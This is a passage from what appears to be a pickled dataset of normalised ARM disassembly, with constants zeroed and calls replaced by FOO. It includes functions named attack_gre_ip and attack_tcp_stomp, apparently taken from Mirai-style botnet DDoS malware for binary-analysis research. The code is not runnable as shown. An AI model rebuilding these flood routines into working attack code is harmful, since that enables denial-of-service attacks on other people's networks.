nCMP~R2,0\nSTR~R2,[SP,0]\nBLE~FOO\nMOV~R4,R3\nLDR~R12,[SP,0]\nMOV~R3,R12,LSL0\nADD~R11,R3,0\nMOV~R0,R11,LSR0\nSTR~R0,[SP,0]\nMOV~R9,R3,LSR0\nADD~R3,R3,0\nSTR~R3,[SP,0]\nMOV~R1,R3,LSR0\nSTR~R1,[SP,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R2,[SP,0]\nSTR~R0,[R2,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R4,[R2,R3,LSL0]\nADD~R1,R4,0\nADD~R0,R4,0\nADD~R5,R4,0\nADD~R6,R4,0\nLDRB~R3,[R4]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4]\nLDRB~R3,[R4]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4]\nSTRB~R10,[R4,0]\nMOV~R3,R11,LSR0\nAND~R3,R3,0\nLDR~R12,[SP,0]\nORR~R3,R12,R3,LSL0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nSTRB~R8,[R4,0]\nCMP~R7,0\nMOVNE~R3,0\nSTRNEB~R3,[R4,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R4,0]\nMOV~R3,0\nSTRB~R3,[R4,0]\nLDR~R3,[SP,0]\nSTR~R3,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nLDR~R12,[SP,0]\nADD~R3,R3,R12\nLDR~R3,[R3,0]\nSTR~R3,[R4,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nSUB~R3,R3,0\nSTRB~R3,[R1,0]\nMOV~R1,0\nORR~R3,R1,0\nSTRB~R3,[R0,0]\nSTRB~R1,[R0,0]\nLDRB~R3,[R5]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R5]\nLDRB~R3,[R5]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R5]\nSTRB~R10,[R5,0]\nADD~R3,R9,0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R5,0]\nLDR~R0,[SP,0]\nMVN~R3,R0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R5,0]\nSTRB~R8,[R5,0]\nCMP~R7,R1\nMOVNE~R3,0\nSTRNEB~R3,[R5,0]\nSTRNEB~R1,[R5,0]\nMOV~R3,0\nSTRB~R3,[R5,0]\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R1,[SP,0]\nCMP~R1,0\nLDRNE~R3,[R4,0]\nSTRNE~R3,[R5,0]\nSUBEQ~R3,R0,0\nMVNEQ~R3,R3\nSTREQ~R3,[R5,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6]\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDR~R12,[SP,0]\nMOV~R3,R12,LSR0\nAND~R2,R12,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDR~R0,[SP,0]\nMOV~R3,R0,LSR0\nAND~R3,R3,0\nLDR~R1,[SP,0]\nORR~R3,R1,R3,LSL0\nSTRB~R3,[R6,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nLDR~R2,[SP,0]\nCMP~R2,R4\nBGT~FOO\nMOV~R3,0\nLDR~R12,[SP,0]\nCMP~R12,R3\nMOV~R2,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R3,0\nSUB~R11,R3,0\nMOV~R10,0\nLDR~R0,[SP,0]\nLDR~R9,[R0,R2,LSL0]\nMOV~R7,R9\nADD~R8,R9,0\nADD~R6,R9,0\nADD~R5,R9,0\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nLDR~R1,[SP,0]\nADD~R2,R3,R1\nLDRB~R3,[R2,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nLDR~R12,[SP,0]\nADD~R3,R3,R12\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R9,0]\nLDR~R0,[SP,0]\nCMN~R0,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R7,0]\nLDR~R1,[SP,0]\nCMP~R1,R11\nBNE~FOO\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSTRB~R0,[R7,0]\nMOV~R3,R0,ASR0\nSTRB~R3,[R7,0]\nSUB~R0,R0,0\nMVN~R0,R0\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,R11\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R3,[SP,0]\nCMP~R3,R11\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R12,[SP,0]\nCMP~R12,0\nLDRNE~R3,[R7,0]\nSTRNE~R3,[R6,0]\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nBL~FOO\nSTR~R0,[SP,0]\nBL~FOO\nSTR~R0,[SP,0]\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R8\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nADD~R0,R8,0\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nADD~R0,R8,0\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nADD~R0,R8,0\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nLDR~R0,[SP,0]\nCMP~R0,0\nADDNE~R0,R5,0\nLDRNE~R1,[SP,0]\nBLNE~FOO\nSTRB~R10,[R7,0]\nSTRB~R10,[R7,0]\nMOV~R0,R7\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R7,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R7,0]\nSTRB~R10,[R6,0]\nSTRB~R10,[R6,0]\nMOV~R0,R6\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R10,[R5,0]\nSTRB~R10,[R5,0]\nLDRB~R3,[R5,0]\nLDRB~R2,[R5,0]\nMOV~R0,R6\nMOV~R1,R5\nORR~R2,R3,R2,LSL0\nLDR~R12,[SP,0]\nADD~R3,R12,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nLDR~R0,[SP,0]\nADD~R1,R3,R0\nMOV~R2,0\nSTRB~R2,[R3,R0]\nSTRB~R10,[R1,0]\nLDR~R3,[R7,0]\nSTR~R3,[R1,0]\nSTRB~R10,[R1,0]\nSTRB~R10,[R1,0]\nSTR~R1,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R9\nLDR~R3,[SP,0]\nADD~R2,R3,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R2,R3,0\nSTR~R2,[SP,0]\nLDR~R12,[SP,0]\nCMP~R2,R12\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p47
L1720L
tp48
a(S'attack_gre_ip'
p49
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R11,R1\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R10,R0,0\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R7,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R9,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R2\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nLDR~R3,[R3]\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R0,[SP,0]\nSTR~R0,[SP,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R9,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nAND~R6,R6,0\nSTR~R6,[SP,0]\nSTR~R4,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R12,[SP,0]\nCMP~R12,0\nSTR~R12,[SP,0]\nBLE~FOO\nMOV~R4,R3\nLDR~R0,[SP,0]\nMOV~R3,R0,LSL0\nADD~R1,R3,0\nSTR~R1,[SP,0]\nMOV~R2,R1,LSR0\nSTR~R2,[SP,0]\nMOV~R9,R3,LSR0\nADD~R3,R3,0\nSTR~R3,[SP,0]\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R12,[SP,0]\nSTR~R0,[R12,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R4,[R12,R3,LSL0]\nADD~R1,R4,0\nADD~R5,R4,0\nADD~R6,R4,0\nLDRB~R3,[R4]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4]\nLDRB~R3,[R4]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4]\nSTRB~R10,[R4,0]\nLDR~R0,[SP,0]\nMOV~R3,R0,LSR0\nAND~R3,R3,0\nLDR~R2,[SP,0]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nLDR~R12,[SP,0]\nMOV~R3,R12,LSR0\nAND~R2,R12,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nSTRB~R8,[R4,0]\nCMP~R7,0\nMOVNE~R3,0\nSTRNEB~R3,[R4,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R4,0]\nMOV~R3,0\nSTRB~R3,[R4,0]\nLDR~R0,[SP,0]\nSTR~R0,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R3,R3,R11\nLDR~R3,[R3,0]\nSTR~R3,[R4,0]\nMOV~R0,0\nMOV~R3,0\nSTRB~R3,[R1,0]\nSTRB~R0,[R1,0]\nLDRB~R3,[R5]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R5]\nLDRB~R3,[R5]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R5]\nSTRB~R10,[R5,0]\nADD~R3,R9,0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R5,0]\nLDR~R1,[SP,0]\nMVN~R3,R1\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R5,0]\nSTRB~R8,[R5,0]\nCMP~R7,R0\nMOVNE~R3,0\nSTRNEB~R3,[R5,0]\nSTRNEB~R0,[R5,0]\nMOV~R3,0\nSTRB~R3,[R5,0]\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R2,[SP,0]\nCMP~R2,0\nLDRNE~R3,[R4,0]\nSTRNE~R3,[R5,0]\nSUBEQ~R3,R0,0\nMVNEQ~R3,R3\nSTREQ~R3,[R5,0]\nLDR~R12,[SP,0]\nMOV~R3,R12,LSR0\nAND~R2,R12,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6]\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDR~R0,[SP,0]\nMOV~R3,R0,LSR0\nAND~R2,R0,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R3,R3,0\nLDR~R2,[SP,0]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[R6,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nLDR~R3,[SP,0]\nCMP~R3,R4\nBGT~FOO\nMOV~R3,0\nLDR~R12,[SP,0]\nCMP~R12,R3\nMOV~R2,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R3,0\nSUB~R9,R3,0\nMOV~R8,0\nLDR~R0,[SP,0]\nLDR~R10,[R0,R2,LSL0]\nMOV~R7,R10\nADD~R6,R10,0\nADD~R5,R10,0\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R2,R3,R11\nLDRB~R3,[R2,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nADD~R3,R3,R11\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R10,0]\nLDR~R1,[SP,0]\nCMN~R1,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R7,0]\nLDR~R2,[SP,0]\nCMP~R2,R9\nBNE~FOO\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSTRB~R0,[R7,0]\nMOV~R3,R0,ASR0\nSTRB~R3,[R7,0]\nSUB~R0,R0,0\nMVN~R0,R0\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,R9\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R12,[SP,0]\nCMP~R12,R9\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R0,[SP,0]\nCMP~R0,0\nLDRNE~R3,[R7,0]\nSTRNE~R3,[R6,0]\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R1,[SP,0]\nCMP~R1,0\nADDNE~R0,R5,0\nLDRNE~R1,[SP,0]\nBLNE~FOO\nSTRB~R8,[R7,0]\nSTRB~R8,[R7,0]\nMOV~R0,R7\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R7,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R7,0]\nSTRB~R8,[R6,0]\nSTRB~R8,[R6,0]\nMOV~R0,R6\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R8,[R5,0]\nSTRB~R8,[R5,0]\nLDRB~R3,[R5,0]\nLDRB~R2,[R5,0]\nMOV~R0,R6\nMOV~R1,R5\nORR~R2,R3,R2,LSL0\nLDR~R12,[SP,0]\nADD~R3,R12,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R1,R3,R11\nMOV~R2,0\nSTRB~R2,[R3,R11]\nSTRB~R8,[R1,0]\nLDR~R3,[R7,0]\nSTR~R3,[R1,0]\nSTRB~R8,[R1,0]\nSTRB~R8,[R1,0]\nSTR~R1,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R10\nLDR~R3,[SP,0]\nADD~R2,R3,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R2,R3,0\nSTR~R2,[SP,0]\nLDR~R12,[SP,0]\nCMP~R12,R2\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p50
L1604L
tp51
a(S'attack_tcp_stomp'
p52
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nMOV~R11,R0\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R9,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R10,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R7,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R2\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R0,[SP,0]\nSTR~R0,[SP,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R2,[SP,0]\nCMP~R2,0\nSTR~R2,[SP,0]\nLDRGT~R3,[SP,0]\nMOVGT~R3,R3,LSR0\nSTRGT~R3,[SP,0]\nBLE~FOO\nLDR~R0,[SP,0]\nADD~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nMOV~R6,R0\nCMN~R0,0\nBEQ~FOO\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nORR~R2,R0,0\nMOV~R0,R6\nMOV~R1,0\nBL~FOO\nMOV~R3,0\nSTRB~R3,[SP,0]\nSUB~R3,R3,0\nSTRB~R3,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nLDR~R1,[SP,0]\nADD~R2,R1,R3\nLDRB~R3,[R2,0]\nCMP~R3,0\nLDRHI~R3,[R2,0]\nSTRHI~R3,[SP,0]\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nLDR~R1,[SP,0]\nADD~R3,R3,R1\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[SP,0]\nMOV~R3,0\nLDR~R2,[SP,0]\nCMP~R2,R3\nBNE~FOO\nBL~FOO\nSTRB~R0,[SP,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[SP,0]\nB~FOO\nLDR~R0,[SP,0]\nAND~R3,R0,0\nLDR~R1,[SP,0]\nORR~R3,R1,R3,LSL0\nSTRB~R3,[SP,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[SP,0]\nMOV~R0,R6\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R4,R0\nLDR~R2,[SP,0]\nSTR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSTR~R3,[SP,0]\nMOV~R0,R3,LSR0\nSTR~R0,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nADD~R3,SP,0\nSTR~R3,[SP]\nADD~R3,SP,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nADD~R1,SP,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nLDR~R12,[SP,0]\nLDR~R3,[SP,0]\nCMP~R3,R12\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLS~R3,0\nCMP~R3,0\nBEQ~FOO\nLDRB~R1,[SP,0]\nLDRB~R3,[SP,0]\nORR~R1,R1,R3,LSL0\nLDRB~R3,[SP,0]\nLDRB~R2,[SP,0]\nORR~R3,R3,R2,LSL0\nCMP~R1,R3\nBNE~FOO\nLDRB~R2,[SP,0]\nAND~R3,R2,0\nCMP~R3,0\nBNE~FOO\nLDR~R4,[SP,0]\nSTR~R12,[R11,R4,LSL0]\nLDR~R2,[R5,0]\nMOV~R0,R4,LSL0\nADD~R0,R0,R11\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R0,0]\nLDR~R3,[R5,0]\nAND~R2,R3,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R3,LSR0\nAND~R1,R3,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R1,LSL0\nORR~R2,R2,R3\nSTR~R2,[R0,0]\nLDR~R3,[R5]\nMOV~R3,R3,LSR0\nSTRB~R3,[R0,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSR0\nSTRB~R3,[R0,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nMOV~R4,R4,LSL0\nLDR~R0,[SP,0]\nBL~FOO\nLDR~R1,[SP,0]\nSTR~R0,[R1,R4]\nLDR~R3,[SP,0]\nLDR~R2,[SP,0]\nLDR~R1,[R2,R3,LSL0]\nADD~R5,R1,0\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDR~R3,[SP,0]\nSTRB~R3,[R1,0]\nLDR~R0,[SP,0]\nMOV~R3,R0,LSR0\nAND~R3,R3,0\nLDR~R2,[SP,0]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R0,[SP,0]\nMOV~R3,R0,LSR0\nAND~R2,R0,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R2,[SP,0]\nSTRB~R2,[R1,0]\nLDR~R3,[SP,0]\nCMP~R3,0\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R1,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R1,0]\nLDR~R3,[SP,0]\nLDR~R3,[R11,R3,LSL0]\nSTR~R3,[R1,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSL0\nADD~R3,R3,R11\nLDRB~R2,[R3,0]\nLDRB~R3,[R3,0]\nORR~R2,R2,R3,LSL0\nSTRB~R2,[R5]\nMOV~R2,R2,ASR0\nSTRB~R2,[R5,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSL0\nADD~R3,R3,R11\nLDRB~R2,[R3,0]\nLDRB~R3,[R3,0]\nORR~R2,R2,R3,LSL0\nSTRB~R2,[R5,0]\nMOV~R2,R2,ASR0\nSTRB~R2,[R5,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSL0\nADD~R3,R3,R11\nLDR~R3,[R3,0]\nSTR~R3,[R5,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSL0\nADD~R3,R3,R11\nLDR~R3,[R3,0]\nSTR~R3,[R5,0]\nLDRB~R3,[R5,0]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nORR~R3,R3,0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nORR~R3,R3,0\nSTRB~R3,[R5,0]\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDRB~R3,[R5,0]\nLDR~R0,[SP,0]\nAND~R2,R0,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nAND~R2,R9,0\nBIC~R3,R3,0\nORR~R3,R3,R2,L